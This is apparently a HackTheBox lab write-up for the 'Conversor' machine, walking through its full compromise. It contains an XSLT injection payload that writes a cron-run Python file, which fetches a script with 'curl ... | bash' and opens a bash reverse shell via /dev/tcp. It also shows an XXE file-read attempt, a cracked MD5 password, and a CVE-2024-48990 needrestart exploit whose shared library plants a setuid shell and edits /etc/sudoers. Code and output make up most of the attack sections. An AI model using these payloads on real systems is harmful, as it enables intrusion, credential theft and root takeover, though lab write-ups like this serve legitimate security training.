---
title: "HTB: Conversor"
# description: ""
date: "2026-03-22 11:33:00 +0800"
categories: [hackthebox,linux]
tags: [xslt,xslt-injection,cve-2024-48990]
pin: false
math: true
mermaid: true
image_path: assets/md_images
image:
  path: assets/md_images/conversor.png

---
**Conversor is a Linux machine running a Flask app that converts nmap XML to HTML via XSLT. Key attack steps: exploit os.path.join path traversal or XSLT's exslt:document to write a reverse shell into a cron directory; crack an MD5 password from a SQLite database to pivot users; escalate to root via CVE-2024-48990 by poisoning PYTHONPATH in needrestart, or abusing its Perl config for direct code execution.**


---

## <span style="color:lightblue">Recon</span>
### <span style="color:lightgreen">Initial Scanning</span>
`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```console
$ sudo nmap -sC -sV 10.10.11.92           
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-26 01:55 CDT
Nmap scan report for 10.10.11.92
Host is up (0.21s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://conversor.htb/
Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### <span style="color:lightgreen">Subdomain Fuzz</span>
use `ffuf` to scan for any subdomains of `conversor.htb`, but no additional subdomains were identified:

```console
$ ffuf -u http://10.10.11.92 -H "Host: FUZZ.conversor.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -ac
..snip..
:: Progress: [19966/19966] :: Job [1/1] :: 498 req/sec :: Duration: [0:00:38] :: Errors: 0 :: 
```

Add `conversor.htb` to hosts file:
```console
$ sudo vi /etc/hosts
10.10.11.92 conversor.htb
```
### <span style="color:lightgreen">Look at website - http 80</span>

Visiting the site just redirects to `/login`,After signing up, we were taken to the `Covertsor` page, which said to upload an `XML` file and an `XSLT` sheet to convert it into a prettier format:

![Desktop View](assets/md_images/conversor-site1.png){: .w-75 .rounded-10 w='1212' h='668' }

There’s also an About page in the menu, which leads to `/about`. We can download source code as `source_code.tar.gz` in `/about` page:

![Desktop View](assets/md_images/conversor-site2.png){: .w-75 .rounded-10 w='1212' h='668' }


#### Directory Brute Force
Run `gobuster`, but no new results beyond what was already known:
```console
$ gobuster dir -u http://conversor.htb -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt 
===============================================================                                                                                            
Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 722]
/register             (Status: 200) [Size: 726]
/logout               (Status: 302) [Size: 199] [--> /login]
/about                (Status: 200) [Size: 2842]
/javascript           (Status: 301) [Size: 319] [--> http://conversor.htb/javascript/]
/.                    (Status: 302) [Size: 199] [--> /login]
/convert              (Status: 405) [Size: 153]
```

### <span style="color:lightgreen">Source Code</span>
Let unzip the sourcecode:
```
$ mkdir src
$ cd src                                                                                                                                     
$ tar -xvf ../source_code.tar.gz
$ ls 
app.py  app.wsgi  install.md  instance  scripts  static  templates  uploads
```

In the archive `/instance` there is `users.db`, but nothing in it:

```
$ sqlite3 users.db
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
files  users
sqlite> .schema users
CREATE TABLE users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT
    );
sqlite> select * from users;
sqlite>
```
Using the VS Code extension `Snyk Security` to scan for insecure code, and it seems that `/convert` has path traversal:

![Desktop View](assets/md_images/conversor-synk.png){: .w-75 .rounded-10 w='1212' h='668' }

I tried to use `XXE` to get `/etc/passwd`, but it showed nothing:
```console
$ cat test.xml
<?xml version="1.0"?>
<!DOCTYPE xsl:stylesheet [
  <!ENTITY content SYSTEM "file:///etc/passwd">
]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <html><body><pre>&content;</pre></body></html>
  </xsl:template>
</xsl:stylesheet>
```

Interestingly, as shown in the source code `install.md` below, so if we find a way to upload to the script, we can get a shell:
```console
..snip..
If you want to run Python scripts 
(for example, our server deletes all files older than 60 minutes to avoid system overload), 
you can add the following line to your /etc/crontab.
"""
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
"""
```


## <span style="color:lightblue">Foothold</span>
Let we use `nmap` to create the `xml` file:
```console
$ sudo nmap -sC -sV 10.10.11.92 -oX nmap.xml
```

Upload `nmap.xml` and `nmap.xslt` (blank template) to get a beautiful scan report:

![Desktop View](assets/md_images/conversor-foothold.png){: .w-75 .rounded-10 w='1212' h='668' }


Let's try making `shell.xslt`, we use [EXSLT-Common](https://exslt.github.io/exsl/index.html) to reference the namespace, then we name the prefix to shell, and finally we use file to upload the python file.

I first use python reverse shell but doesn't get a shell, so change to use `curl`.
```console
$ cat shell.xslt
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet 
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
    xmlns:shell="http://exslt.org/common"
    extension-element-prefixes="shell"
    version="1.0"
>
<xsl:template match="/">
<shell:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import os
os.system("curl 10.10.14.81:8000/shell.sh|bash")
</shell:document>
</xsl:template>
</xsl:stylesheet>
```

Create `shell.sh` and open `python` http server.
```
$ cat shell.sh
#!/bin/bash                                     
bash -i >& /dev/tcp/10.10.14.81/9001 0>&1

$ python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

After uploading `nmap.xml` and `shell.xslt`, access youUploadfile.html. We open listener and wait for cron to execute (every 60 seconds) and then get the shell.
```
$ rlwrap nc -lvnp 9001        
listening on [any] 9001 ...
connect to [10.10.14.81] from (UNKNOWN) [10.10.11.92] 49408
bash: cannot set terminal process group (17504): Inappropriate ioctl for device
www-data@conversor:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@conversor:~$ ^Z
zsh: suspended  rlwrap nc -lvnp 9001
                                                                                                                                                           
$ stty raw -echo; fg
[1]  + continued  rlwrap nc -lvnp 9001
www-data@conversor:~$
```

## <span style="color:lightblue">Shell as fismathack</span>
### <span style="color:lightgreen">Enumeration</span>

First, check the website source code located at`/var/www/conversor.htb`:
```console
www-data@conversor:~/conversor.htb$ ls
app.py  app.wsgi  instance  __pycache__  scripts  static  templates  uploads
```
We can find the hashes in `/instance/users.db`:
```console
www-data@conversor:~/conversor.htb/instance$ sqlite3 users.db
..snip..
sqlite> .tables
files  users
sqlite> .schema users
CREATE TABLE users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT
    );
sqlite> select * from users;
1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
5|test|465e929fc1e0853025faad58fc8cb47d
sqlite> .quit
www-data@conversor:~/conversor.htb/instance$
```
### <span style="color:lightgreen">SSH in fismathack</span>
These are `MD5`, so we crack them using `crackstaion` and we get the credentials `Keepmesafeandwarm`. We can `ssh` in `fismathack` and grab user flag:
```console
$ ssh fismathack@conversor.htb
password:Keepmesafeandwarm
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-160-generic x86_64)
...[snip]...
fismathack@conversor:~$ cat user.txt
01ffa4cb************************
```


## <span style="color:lightblue">Shell as root</span>
### <span style="color:lightgreen">Enumeration</span>
`fismathack` can run `needrestart` as any user without a password using `sudo`:
```console
fismathack@conversor:~$ sudo -l
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

We can use `-c` flag to get `root.txt`:
```console
fismathack@conversor:~$ sudo /usr/sbin/needrestart -h 
   ..snip..
   -c <cfg>    config filename   
   ...snip...
fismathack@conversor:~$ sudo /usr/sbin/needrestart -c /root/root.txt
Bareword found where operator expected at (eval 14) line 1, near "4d*************************6"
    (Missing operator before df026a9d86b5fd11fe78399da329316?)
Error parsing /root/root.txt: syntax error at (eval 14) line 2, near "4d************************6"
```

And the needrestart version is old.
```console
fismathack@conversor:~$ sudo /usr/sbin/needrestart -v
[main] eval /etc/needrestart/needrestart.conf
[main] needrestart v3.7
[main] running in root mode
...snip...
```

### <span style="color:lightgreen">CVE-2024–48990</span>
So it is possible to use CVE-2024–48990 to get a shell, but the target does not have `gcc`, so we need to build `lib.c` on our machine first:

```console
$ git clone https://github.com/pentestfunctions/CVE-2024-48990-PoC-Testing
$ cd CVE-2024-48990-PoC-Testing

$ cat lib.c 
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
static void a() __attribute__((constructor));
void a() {
    if(geteuid() == 0) {  // Only execute if we're running with root privileges
        setuid(0);
        setgid(0);
        const char *shell = "cp /bin/sh /tmp/poc; "
                            "chmod u+s /tmp/poc; "
                            "grep -qxF 'ALL ALL=NOPASSWD: /tmp/poc' /etc/sudoers || "
                            "echo 'ALL ALL=NOPASSWD: /tmp/poc' | tee -a /etc/sudoers > /dev/null &";
        system(shell);
    }
}
```

Compile `lib.c` with `gcc`:

```console
# gcc, i use ARM64 so need cross compile.
$ x86_64-linux-gnu-gcc -shared -fPIC -o __init__.so lib.c

# if you use AMD64, use:
$ gcc -shared -fPIC -o __init__.so lib.c
```

Then we modify `runner.sh`, remove the `lib.c` part, and change `gcc` to `curl` the `__init__.so` we just compiled:

```console
$ cat runner.sh
#!/bin/bash
set -e
cd /tmp
mkdir -p malicious/importlib
#chage to your ip
curl http://10.10.14.118:8000/__init__.so -o /tmp/malicious/importlib/__init__.so
# Minimal Python script to trigger import
cat << 'EOF' > /tmp/malicious/e.py
import time
while True:
    try:
        import importlib
    except:
        pass
    if __import__("os").path.exists("/tmp/poc"):
        print("Got shell!, delete traces in /tmp/poc, /tmp/malicious")
        __import__("os").system("sudo /tmp/poc -p")
        break
    time.sleep(1)
EOF
cd /tmp/malicious; PYTHONPATH="$PWD" python3 e.py 2>/dev/null
```

Open python http server:
```console
$ python3 -m http.server                                                   
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

After executing `runner.sh`, we need to open another `ssh` window and execute `sudo /usr/sbin/needrestart` to obtain the root shell.
```console
fismathack@conversor:/dev/shm$ wget http://10.10.14.118:8000/runner.sh       
fismathack@conversor:/dev/shm$ chmod +x runner.sh
fismathack@conversor:/dev/shm$ ./runner.sh
Got shell!, delete traces in /tmp/poc, /tmp/malicious
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
4d*********************16
```


